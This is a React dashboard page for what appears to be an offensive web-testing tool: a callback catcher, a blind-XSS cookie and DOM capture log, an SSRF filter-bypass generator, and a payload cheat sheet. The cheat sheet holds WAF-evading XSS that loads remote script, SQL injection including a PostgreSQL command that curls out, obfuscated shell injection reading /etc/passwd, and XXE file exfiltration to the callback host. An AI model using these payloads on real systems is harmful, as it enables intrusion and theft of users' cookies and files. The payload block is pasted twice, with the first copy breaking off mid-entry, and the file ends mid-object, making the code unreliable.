'use client';

import { useState, useEffect, use, useRef } from 'react';
import Link from 'next/link';
import { 
  Webhook, ChevronRight, Copy, Check, Settings, Trash2, Send, 
  ExternalLink, Globe, Wifi, ShieldAlert, Play, Search, 
  AlertCircle, RefreshCw, ArrowLeft, ArrowUpRight, HelpCircle, 
  Database, User, Network, FileCode, Radio, Terminal, Zap,
  ShieldCheck, Cpu, BookOpen
} from 'lucide-react';
import styles from '@/styles/dashboard.module.css';

// SSRF Bypass Payload Generator Helper
function generateSsrfBypasses(host) {
  if (!host) return [];
  
  const cleanHost = host.trim().replace(/^https?:\/\//i, '').split('/')[0].split(':')[0];
  const results = [];

  // Helper to check if IP
  const ipv4Regex = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/;
  const isIpv4 = ipv4Regex.test(cleanHost);

  let octets = [127, 0, 0, 1];
  if (isIpv4) {
    const match = cleanHost.match(ipv4Regex);
    octets = [parseInt(match[1]), parseInt(match[2]), parseInt(match[3]), parseInt(match[4])];
  } else if (cleanHost.toLowerCase() === 'localhost') {
    octets = [127, 0, 0, 1];
  } else {
    const unicodeLookalikes = {
      'a': 'ⓐ', 'b': 'ⓑ', 'c': 'ⓒ', 'd': 'ⓓ', 'e': 'ⓔ', 'f': 'ⓕ', 'g': 'ⓖ', 'h': 'ⓗ', 'i': 'ⓘ', 'j': 'ⓙ',
      'k': 'ⓚ', 'l': 'ⓛ', 'm': 'ⓜ', 'n': 'ⓝ', 'o': 'ⓞ', 'p': 'ⓟ', 'q': 'ⓠ', 'r': 'ⓡ', 's': 'ⓢ', 't': 'ⓣ',
      'u': 'ⓤ', 'v': 'ⓥ', 'w': 'ⓦ', 'x': 'ⓧ', 'y': 'ⓨ', 'z': 'ⓩ', '.': '.'
    };
    
    let unicodeObfuscated = '';
    for (let char of cleanHost.toLowerCase()) {
      unicodeObfuscated += unicodeLookalikes[char] || char;
    }

    results.push({
      category: 'Unicode Normalization',
      payload: `http://${unicodeObfuscated}`,
      desc: 'Bypasses blacklists that do not normalize Unicode strings before validation checks.'
    });

    results.push({
      category: 'User-Info Slash Confusion',
      payload: `http://localhost@${cleanHost}`,
      desc: 'Injecting credentials syntax to confuse host domain parsers.'
    });

    results.push({
      category: 'CNAME Redirect Wrapper',
      payload: `http://foo.bar.${cleanHost}`,
      desc: 'Subdomain hijack / parsing check bypass'
    });

    return results;
  }

  // --- IPv4 Specific Bypasses ---
  const [a, b, c, d] = octets;
  const decimal = (a * 16777216) + (b * 65536) + (c * 256) + d;
  const hexOctets = octets.map(o => '0x' + o.toString(16));
  const octalOctets = octets.map(o => '0' + o.toString(8));
  
  results.push({
    category: 'Pure 32-Bit Decimal IP',
    payload: `http://${decimal}`,
    desc: 'Translates the standard octets into a single unified 32-bit integer.'
  });

  results.push({
    category: 'Standard Hexadecimal IP',
    payload: `http://${hexOctets.join('.')}`,
    desc: 'Each separate octet is encoded in base-16 hex format.'
  });

  results.push({
    category: 'Compressed Hex Integer',
    payload: `http://0x${decimal.toString(16)}`,
    desc: 'The entire decimal integer converted to hex as a single raw value.'
  });

  results.push({
    category: 'Octal IP Encoding',
    payload: `http://${octalOctets.join('.')}`,
    desc: 'Octets are written in base-8 with leading zero indicator padding.'
  });

  if (a === 127 && b === 0 && c === 0) {
    results.push({
      category: 'Short IP (Truncated Loopback)',
      payload: `http://127.1`,
      desc: 'Unix systems automatically pad omitted octets with trailing zeros.'
    });

    results.push({
      category: 'Short IP (Decimal Loopback)',
      payload: `http://127.0.1`,
      desc: 'Alternative compact class-A padding syntax.'
    });
    
    results.push({
      category: 'Alternative Loopback IP',
      payload: `http://127.127.127.127`,
      desc: 'The entire class-A block 127.0.0.0/8 resolves back to loopback.'
    });
    
    results.push({
      category: 'Zero Broadcast Address',
      payload: `http://0.0.0.0`,
      desc: 'Resolves to localhost on Unix, BSD, and macOS server platforms.'
    });
    
    results.push({
      category: 'Single Digit Zero IP',
      payload: `http://0`,
      desc: 'Ultimate compressed loopback pointer.'
    });
  }

  results.push({
    category: 'IPv6 Compressed',
    payload: `http://[::1]`,
    desc: 'Standard compressed IPv6 loopback pointer.'
  });

  results.push({
    category: 'IPv4-mapped IPv6',
    payload: `http://[::ffff:${a.toString(16).padStart(2, '0')}${b.toString(16).padStart(2, '0')}:${c.toString(16).padStart(2, '0')}${d.toString(16).padStart(2, '0')}]`,
    desc: 'Dual-stack IPv4 embedded within IPv6 format.'
  });

  results.push({
    category: 'Nip.io Wildcard DNS',
    payload: `http://${a}.${b}.${c}.${d}.nip.io`,
    desc: 'Free wildcard DNS resolver that always routes queries back to target IP.'
  });

  results.push({
    category: 'Sslip.io Wildcard DNS',
    payload: `http://${a}.${b}.${c}.${d}.sslip.io`,
    desc: 'Another resilient wildcard DNS resolving service.'
  });

  return results;
}

export default function DashboardPage({ params }) {
  const resolvedParams = use(params);
  const id = resolvedParams.id;

  // Active Main Navigation Module state
  const [activeTab, setActiveTab] = useState('OOB'); // 'OOB', 'XSS', 'SSRF', 'PAYLOADS'

  // --- OOB Webhook Ingestion states ---
  const [requests, setRequests] = useState([]);
  const [totalCount, setTotalCount] = useState(0);
  const [config, setConfig] = useState({
    status: 200,
    contentType: 'application/json',
    body: JSON.stringify({ success: true, message: 'OOB Callback recorded successfully' })
  });

  const [selectedRequest, setSelectedRequest] = useState(null);
  const [searchQuery, setSearchQuery] = useState('');
  const [filterMethod, setFilterMethod] = useState('ALL');
  const [isConfigOpen, setIsConfigOpen] = useState(false);
  const [copiedText, setCopiedText] = useState('');
  const [isPollingActive, setIsPollingActive] = useState(true);

  // Response configuration form state
  const [configStatus, setConfigStatus] = useState('200');
  const [configContentType, setConfigContentType] = useState('application/json');
  const [configBody, setConfigBody] = useState('');

  // Forwarding form state
  const [forwardTarget, setForwardTarget] = useState('');
  const [forwardState, setForwardingState] = useState('idle'); // idle, loading, success, error
  const [forwardResult, setForwardResult] = useState(null);

  const prevRequestsCountRef = useRef(0);

  // --- XSS Hunter states ---
  const [xssTriggers, setXssTriggers] = useState([]);
  const [selectedXss, setSelectedXss] = useState(null);
  const [xssSearchQuery, setXssSearchQuery] = useState('');

  // --- SSRF Bypass states ---
  const [ssrfTarget, setSsrfTarget] = useState('127.0.0.1');
  const [ssrfBypasses, setSsrfBypasses] = useState([]);

  // --- Payloads Cheat Sheet states ---
  const [payloadsSearchQuery, setPayloadsSearchQuery] = useState('');
  const [selectedPayloadCategory, setSelectedPayloadCategory] = useState('ALL');
  const [payloadFilterPriority, setPayloadFilterPriority] = useState('ALL'); // 'ALL', 'HIGH', 'MEDIUM', 'LOW'

  // Load origin on client side
  const [origin, setOrigin] = useState('');
  useEffect(() => {
    if (typeof window !== 'undefined') {
      setOrigin(window.location.origin);
    }
  }, []);

  const webhookUrl = `${origin || 'https://domain.com'}/api/r/${id}`;
  const xssPayloadUrl = `${origin || 'https://domain.com'}/api/x?id=${id}`;

  // Fetch Webhook logs
  const fetchInspectionData = async (isInitial = false) => {
    try {
      const response = await fetch(`/api/inspect/${id}`);
      if (!response.ok) throw new Error('Failed to fetch data');
      
      const data = await response.json();
      if (data.success) {
        setRequests(data.requests || []);
        setTotalCount(data.totalCount || 0);
        setConfig(data.config || config);

        if (data.requests && data.requests.length > 0) {
          if (isInitial || !selectedRequest) {
            setSelectedRequest(data.requests[0]);
          } else {
            const currentFirst = data.requests[0];
            if (selectedRequest && !data.requests.some(r => r.requestId === selectedRequest.requestId)) {
              setSelectedRequest(currentFirst);
            }
          }
        } else {
          setSelectedRequest(null);
        }

        prevRequestsCountRef.current = data.requests ? data.requests.length : 0;
      }
    } catch (error) {
      console.error('Error fetching logs:', error);
    }
  };

  // Fetch XSS logs
  const fetchXssData = async (isInitial = false) => {
    try {
      const response = await fetch(`/api/inspect/${id}/xss`);
      if (!response.ok) throw new Error('Failed to fetch XSS data');
      const data = await response.json();
      if (data.success) {
        setXssTriggers(data.triggers || []);

        if (data.triggers && data.triggers.length > 0) {
          if (isInitial || !selectedXss) {
            setSelectedXss(data.triggers[0]);
          } else {
            const stillExists = data.triggers.find(t => t.triggerId === selectedXss.triggerId);
            if (!stillExists) {
              setSelectedXss(data.triggers[0]);
            } else {
              setSelectedXss(stillExists);
            }
          }
        } else {
          setSelectedXss(null);
        }
      }
    } catch (err) {
      console.error('Error fetching XSS:', err);
    }
  };

  // Initial and reactive fetch triggers on tab change
  useEffect(() => {
    if (activeTab === 'OOB') {
      fetchInspectionData(true);
    } else if (activeTab === 'XSS') {
      fetchXssData(true);
    }
  }, [id, activeTab]);

  // Setup active polling loop
  useEffect(() => {
    let intervalId;
    if (isPollingActive) {
      intervalId = setInterval(() => {
        if (activeTab === 'OOB') {
          fetchInspectionData();
        } else if (activeTab === 'XSS') {
          fetchXssData();
        }
      }, 1500);
    }

    return () => {
      if (intervalId) clearInterval(intervalId);
    };
  }, [id, isPollingActive, activeTab, selectedRequest, selectedXss]);

  // Generate SSRF payloads
  useEffect(() => {
    setSsrfBypasses(generateSsrfBypasses(ssrfTarget));
  }, [ssrfTarget]);

  // Sync config form when modal opens
  useEffect(() => {
    if (isConfigOpen) {
      setConfigStatus(String(config.status));
      setConfigContentType(config.contentType);
      setConfigBody(config.body);
    }
  }, [isConfigOpen, config]);

  // Save history to localStorage
  useEffect(() => {
    if (id) {
      const saved = localStorage.getItem('webhook_inspector_history');
      let list = [];
      if (saved) {
        try { list = JSON.parse(saved); } catch (e) {}
      }
      if (!list.some(item => item.id === id)) {
        list.unshift({
          id,
          label: 'Stealth OOB Ingestion',
          createdAt: new Date().toISOString()
        });
        localStorage.setItem('webhook_inspector_history', JSON.stringify(list.slice(0, 10)));
      }
    }
  }, [id]);

  // Copy to clipboard helper
  const handleCopy = (text, label) => {
    navigator.clipboard.writeText(text);
    setCopiedText(label);
    setTimeout(() => setCopiedText(''), 2000);
  };

  // Clear Webhook request logs
  const handleClearLogs = async () => {
    if (!confirm('Are you absolutely sure you want to purge all captured callback logs?')) return;
    try {
      const response = await fetch(`/api/inspect/${id}/clear`, { method: 'POST' });
      if (response.ok) {
        setRequests([]);
        setTotalCount(0);
        setSelectedRequest(null);
      }
    } catch (e) {
      alert('Failed to clear logs.');
    }
  };

  // Clear XSS Trigger logs
  const handleClearXssLogs = async () => {
    if (!confirm('Are you absolutely sure you want to purge all captured Blind XSS logs?')) return;
    try {
      const response = await fetch(`/api/inspect/${id}/xss/clear`, { method: 'POST' });
      if (response.ok) {
        setXssTriggers([]);
        setSelectedXss(null);
      }
    } catch (e) {
      alert('Failed to clear XSS logs.');
    }
  };

  // Save custom response config
  const handleSaveConfig = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`/api/r/${id}/config`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          status: configStatus,
          contentType: configContentType,
          body: configBody
        })
      });

      if (response.ok) {
        const data = await response.json();
        if (data.success) {
          setConfig(data.config);
          setIsConfigOpen(false);
          setCopiedText('config-saved');
          setTimeout(() => setCopiedText(''), 2000);
        }
      }
    } catch (err) {
      alert('Failed to save configuration.');
    }
  };

  // Forward/Replay request
  const handleForwardRequest = async (e) => {
    e.preventDefault();
    if (!forwardTarget.trim() || !selectedRequest) return;

    setForwardingState('loading');
    setForwardResult(null);

    try {
      const response = await fetch(`/api/inspect/${id}/forward`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          targetUrl: forwardTarget,
          method: selectedRequest.method,
          headers: selectedRequest.headers,
          body: selectedRequest.body
        })
      });

      const data = await response.json();
      if (response.ok && data.success) {
        setForwardingState('success');
        setForwardResult(data);
      } else {
        setForwardingState('error');
        setForwardResult(data);
      }
    } catch (err) {
      setForwardingState('error');
      setForwardResult({ message: err.message });
    }
  };

  // Regex-based JSON syntax highlighting
  const getHighlightedJson = (jsonStr) => {
    try {
      let parsed = jsonStr;
      if (typeof jsonStr === 'string') {
        parsed = JSON.parse(jsonStr);
      }
      const formatted = JSON.stringify(parsed, null, 2);
      
      const escaped = formatted
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');

      const highlighted = escaped.replace(
        /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+-]?\d+)?)/g,
        (match) => {
          let cls = styles.jsonNumber;
          if (/^"/.test(match)) {
            if (/:$/.test(match)) {
              cls = styles.jsonKey;
            } else {
              cls = styles.jsonString;
            }
          } else if (/true|false/.test(match)) {
            cls = styles.jsonBoolean;
          } else if (/null/.test(match)) {
            cls = styles.jsonNull;
          }
          return `<span class="${cls}">${match}</span>`;
        }
      );

      return { __html: highlighted };
    } catch (e) {
      return { __html: jsonStr };
    }
  };

  // Filters Webhook Requests
  const filteredRequests = requests.filter(req => {
    const matchesSearch = 
      req.path.toLowerCase().includes(searchQuery.toLowerCase()) || 
      req.ip.includes(searchQuery) ||
      (req.body && req.body.toLowerCase().includes(searchQuery.toLowerCase()));
    
    const matchesMethod = filterMethod === 'ALL' || req.method === filterMethod;

    return matchesSearch && matchesMethod;
  });

  // Filters XSS Triggers
  const filteredXssTriggers = xssTriggers.filter(trig => {
    const query = xssSearchQuery.toLowerCase();
    return (
      trig.uri.toLowerCase().includes(query) ||
      trig.ip.includes(query) ||
      (trig.dom && trig.dom.toLowerCase().includes(query)) ||
      (trig.cookies && trig.cookies.toLowerCase().includes(query))
    );
  });

  // Payloads Cheat Sheet Library (Pre-Configured dynamically with custom URLs!)
  const payloadsData = [
    {
      category: 'XSS',
      title: 'Cross-Site Scripting (XSS)',
      items: [
        { 
          title: 'Dynamic Blind XSS Payload (2026 Stealth)', 
          code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, 
          desc: 'Evades keyword engines looking for evaluation parameters and alert brackets. Uses ES6 dynamic chunked importing.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'MathML onbegin Animation Injection', 
          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, 
          desc: 'Triggered instantly during DOM building without using standard elements like <img> or <body>. Bypasses classic HTML parsers.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Custom Elements with Shadow DOM clicking', 
          code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, 
          desc: 'Bypasses WAF regexes that inspect classic HTML elements. Obfuscates javascript commands inside base64 decoding.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Fetch External JavaScript Eval Bypass', 
          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
          desc: 'Using fetch API instead of standard script tags. Completely evades script filters by pulling and evaluating code inside window scope.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Iframe Source Document script execution', 
          code: `<iframe srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x69;&#x6D;&#x70;&#x6F;&#x72;&#x74;&#x28;&#x27;${xssPayloadUrl}&#x27;&#x29;&#x3C;&#x2F;&#x33;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"></iframe>`, 
          desc: 'An iframe with html-entity encoded source document script element. Completely unreadable to WAF regex filters.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'HTML5 Image Tag Error Fallback', 
          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
          desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Anchor Tag javascript URI pseudo-protocol', 
          code: `<a href="javascript:import('${xssPayloadUrl}')">Click for reward</a>`, 
          desc: 'Requires user interaction. Useful for stored social engineering / link injection attacks in markdown comments.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Input Element autofocus handler', 
          code: `<input autofocus onfocus="import('${xssPayloadUrl}')">`, 
          desc: 'Bypasses filters blocking onload/onerror handlers by exploiting auto-focusing elements.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Simple Image Source alert (Zaman Batu)', 
          code: `<img src=x onerror=alert(1)>`, 
          desc: 'The absolute classic. High detection rates but perfect for checking standard unfiltered entry points.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        },
        { 
          title: 'Raw Script tag (Zaman Batu)', 
          code: `<script>alert(1)</script>`, 
          desc: 'Pure legacy script block. Blocked by 99% of WAFs, but still useful to check local offline databases.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        }
      ]
    },
    {
      category: 'SQLI',
      title: 'SQL Injection (SQLi)',
      items: [
        { 
          title: 'MySQL Space-less Filter Bypass', 
          code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, 
          desc: 'Replaces whitespace characters with empty C-style block comments to confuse regex space triggers.',
          priority: 'HIGH', 
          era: 'WAF Bypass' 
        },
        { 
          title: 'Scientific Notation Arithmetic', 
          code: `1e0' OR 1.0=1.0--`, 
          desc: 'Translates query conditions into exponential mathematics to completely bypass simple numeric comparison rules.',
          priority: 'HIGH', 
          era: 'WAF Bypass' 
        },
        { 
          title: 'Heavy Query Time-Based Exfiltration (MySQL)', 
          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)--`, 
          desc: 'Time-delay based validation. Perfect for checking blind SQL injection points without utilizing noisy syntax strings.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'PostgreSQL Time-Based Stacked Query', 
          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/pg_rce'--`, 
          desc: 'Requires database admin superuser privileges. Performs an out-of-band RCE using postgres dynamic command shell execution.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Hexadecimal String Injection', 
          code: `0x61646d696e`, 
          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Database Version String Concatenation', 
          code: `' UNION SELECT NULL,@@version,NULL,NULL--`, 
          desc: 'Retrieves server engine distribution context. Relies on standard UNION extraction vectors.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Simple Authentication Bypass (Zaman Batu)', 
          code: `' OR 1=1--`, 
          desc: 'Standard query comparison override. High detection rates but classic logic.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        },
        { 
          title: 'Basic Admin Single-Quote (Zaman Batu)', 
          code: `admin'--`, 
          desc: 'Standard string parameter termination, useful for primitive login portals.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        }
      ]
    },
    {
      category: 'RCE',
      title: 'Command Injection (RCE)',
      items: [
        { 
          title: 'Bash IFS & Single Quote Splitting', 
          code: `c'a't$IFS/e't'c/p'a's's'wd`, 
          desc: 'Bypasses literal string matches (like "cat" and "/etc/passwd") and space triggers using single quotes and internal field separators.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Bash Path Wildcards', 
          code: `/bi?/c*t$IFS/et?/pa??wd`, 
          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Bash Empty Uninitialized variable bypass', 
          code: `ca$@t$IFS/etc/pass$@wd`, 
          desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Hex-Encoded Command Pipeline Execution', 
          code: `$(echo -e "\\x63\\x61\\x74") $IFS /etc/passwd`, 
          desc: 'Converts target command binary names into hexadecimal bytes, evaluating them on the fly at shell execution.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Base64 Decoded Pipeline', 
          code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
          desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Backtick subshell command substitution', 
          code: `\`id\``, 
          desc: 'Executes nested target parameters inside modern shell configurations.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass' 
        },
        { 
          title: 'Simple cURL Command (Zaman Batu)', 
          code: `; curl ${webhookUrl}`, 
          desc: 'Raw cURL request. Easily detected by simple WAF rules looking for outbound HTTP keywords.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        },
        { 
          title: 'Basic Semicolon Divider (Zaman Batu)', 
          code: `; id`, 
          desc: 'Direct parameter append execution. Easily blocked by character filter rules.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)' 
        }
      ]
    },
    {
      category: 'XXE',
      title: 'XML External Entity (XXE)',
      items: [
        { 
          title: 'UTF-16 BE Document encoding', 
          code: `[Convert XML to UTF-16 BE encoding bytes]`, 
          desc: 'Sending XML document parameters encoded in UTF-16 Big Endian completely blinds WAFs that inspect UTF-8 traffic, while parser parses it normally.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
        },
        { 
          title: 'Nested Parameter Entities Blind Call', 
          code: `<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "${webhookUrl}/poc.dtd">%dtd;]><foo>&send;</foo>`, 
          desc: 'Uses external malicious DTD rules to parse local files and exfiltrate variables to OOB host.',
          priority: 'HIGH', 
          era: 'WAF Bypass' 
        },
        { 
          title: 'XML Entity Parameter Dynamic Exfiltration', 
          code: `<!ENTITY % pay SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">`, 
          desc: 'Uses PHP filter streams to base64-encode sensitive local system files before passing them outwards to OOB endpoint, preventing parser errors.',
          priority: 'HIGH', 
          era: '2026 Stealth' 
  // Payloads Cheat Sheet Library (Pre-Configured dynamically with custom URLs!)
  const payloadsData = [
    {
      category: 'XSS',
      title: 'Cross-Site Scripting (XSS)',
      items: [
        { 
          title: 'Dynamic Blind XSS Payload (2026 Stealth)', 
          code: `top['ev'+'al']('import(\\\"${xssPayloadUrl}\\\")')`, 
          desc: 'Evades keyword engines looking for evaluation parameters and alert brackets. Uses ES6 dynamic chunked importing.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Browser JS / HTML'
        },
        { 
          title: 'MathML onbegin Animation Injection', 
          code: `<svg><animate onbegin="import('${xssPayloadUrl}')" attributeName="x"></svg>`, 
          desc: 'Triggered instantly during DOM building without using standard elements like <img> or <body>. Bypasses classic HTML parsers.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Browser JS / MathML'
        },
        { 
          title: 'Custom Elements with Shadow DOM clicking', 
          code: `<x-xss id=x onclick="eval(atob('${typeof btoa !== 'undefined' ? btoa(`import('${xssPayloadUrl}')`) : 'aW1wb3J0KCd4c3MnKQ=='}'))">click</x-xss>`, 
          desc: 'Bypasses WAF regexes that inspect classic HTML elements. Obfuscates javascript commands inside base64 decoding.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Browser JS / Shadow DOM'
        },
        { 
          title: 'Fetch External JavaScript Eval Bypass', 
          code: `fetch('${xssPayloadUrl}').then(r=>r.text()).then(t=>top['ev'+'al'](t))`, 
          desc: 'Using fetch API instead of standard script tags. Completely evades script filters by pulling and evaluating code inside window scope.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Browser JS / APIs'
        },
        { 
          title: 'Iframe Source Document script execution', 
          code: `<iframe srcdoc="&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x69;&#x6D;&#x70;&#x6F;&#x72;&#x74;&#x28;&#x27;${xssPayloadUrl}&#x27;&#x29;&#x3C;&#x2F;&#x33;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;"></iframe>`, 
          desc: 'An iframe with html-entity encoded source document script element. Completely unreadable to WAF regex filters.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Browser JS / Iframe'
        },
        { 
          title: 'HTML5 Image Tag Error Fallback', 
          code: `<img src=x onerror="import('${xssPayloadUrl}').catch(e=>{})">`, 
          desc: 'Standard HTML5 event bypass. Uses ES6 import to load external script.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'HTML5 / JS'
        },
        { 
          title: 'Anchor Tag javascript URI pseudo-protocol', 
          code: `<a href="javascript:import('${xssPayloadUrl}')">Click for reward</a>`, 
          desc: 'Requires user interaction. Useful for stored social engineering / link injection attacks in markdown comments.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'HTML / JS'
        },
        { 
          title: 'Input Element autofocus handler', 
          code: `<input autofocus onfocus="import('${xssPayloadUrl}')">`, 
          desc: 'Bypasses filters blocking onload/onerror handlers by exploiting auto-focusing elements.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'HTML5 / JS'
        },
        { 
          title: 'Simple Image Source alert (Zaman Batu)', 
          code: `<img src=x onerror=alert(1)>`, 
          desc: 'The absolute classic. High detection rates but perfect for checking standard unfiltered entry points.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'HTML / JS'
        },
        { 
          title: 'Raw Script tag (Zaman Batu)', 
          code: `<script>alert(1)</script>`, 
          desc: 'Pure legacy script block. Blocked by 99% of WAFs, but still useful to check local offline databases.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'HTML / Script Tag'
        }
      ]
    },
    {
      category: 'SQLI',
      title: 'SQL Injection (SQLi)',
      items: [
        { 
          title: 'MySQL Space-less Filter Bypass', 
          code: `'/**/UNION/**/SELECT/**/1,2,user(),4,5--`, 
          desc: 'Replaces whitespace characters with empty C-style block comments to confuse regex space triggers.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'MySQL / Aurora'
        },
        { 
          title: 'Scientific Notation Arithmetic', 
          code: `1e0' OR 1.0=1.0--`, 
          desc: 'Translates query conditions into exponential mathematics to completely bypass simple numeric comparison rules.',
          priority: 'HIGH', 
          era: 'WAF Bypass',
          tech: 'MySQL / PostgreSQL'
        },
        { 
          title: 'Heavy Query Time-Based Exfiltration (MySQL)', 
          code: `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))x)--`, 
          desc: 'Time-delay based validation. Perfect for checking blind SQL injection points without utilizing noisy syntax strings.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'MySQL / MariaDB'
        },
        { 
          title: 'PostgreSQL Time-Based Stacked Query', 
          code: `';COPY (SELECT '') TO PROGRAM 'curl ${webhookUrl}/pg_rce'--`, 
          desc: 'Requires database admin superuser privileges. Performs an out-of-band RCE using postgres dynamic command shell execution.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'PostgreSQL / Linux'
        },
        { 
          title: 'Hexadecimal String Injection', 
          code: `0x61646d696e`, 
          desc: 'Bypasses quote filtering by translating SQL string constraints directly to base-16 hexadecimal literals.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'MySQL / SQLite'
        },
        { 
          title: 'Database Version String Concatenation', 
          code: `' UNION SELECT NULL,@@version,NULL,NULL--`, 
          desc: 'Retrieves server engine distribution context. Relies on standard UNION extraction vectors.',
          priority: 'MEDIUM', 
          era: 'Standard Bypass',
          tech: 'MySQL / SQL Server'
        },
        { 
          title: 'Simple Authentication Bypass (Zaman Batu)', 
          code: `' OR 1=1--`, 
          desc: 'Standard query comparison override. High detection rates but classic logic.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'SQL Databases'
        },
        { 
          title: 'Basic Admin Single-Quote (Zaman Batu)', 
          code: `admin'--`, 
          desc: 'Standard string parameter termination, useful for primitive login portals.',
          priority: 'LOW', 
          era: 'Zaman Batu (Classic)',
          tech: 'SQL Databases'
        }
      ]
    },
    {
      category: 'RCE',
      title: 'Command Injection (RCE)',
      items: [
        { 
          title: 'Bash IFS & Single Quote Splitting', 
          code: `c'a't$IFS/e't'c/p'a's's'wd`, 
          desc: 'Bypasses literal string matches (like "cat" and "/etc/passwd") and space triggers using single quotes and internal field separators.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Unix Shell / Bash'
        },
        { 
          title: 'Bash Path Wildcards', 
          code: `/bi?/c*t$IFS/et?/pa??wd`, 
          desc: 'Triggers commands using directory wildcard expansion matching, evading keyword filters.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Unix Shell / Alpine'
        },
        { 
          title: 'Bash Empty Uninitialized variable bypass', 
          code: `ca$@t$IFS/etc/pass$@wd`, 
          desc: 'Bash automatically strips empty variables (`$@`) before executing commands, rendering string signatures useless.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Unix Shell / Bash'
        },
        { 
          title: 'Hex-Encoded Command Pipeline Execution', 
          code: `$(echo -e "\\x63\\x61\\x74") $IFS /etc/passwd`, 
          desc: 'Converts target command binary names into hexadecimal bytes, evaluating them on the fly at shell execution.',
          priority: 'HIGH', 
          era: '2026 Stealth',
          tech: 'Unix Shell / Linux'
        },
        { 
          title: 'Base64 Decoded Pipeline', 
          code: `echo$IFS'Y2F0IC9ldGMvcGFzc3dk'$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'bash'`, 
          desc: 'Decodes a base64 string on the fly and pipes it to bash, keeping keywords completely hidden from firewalls.',
          priority: 'MEDIUM', 
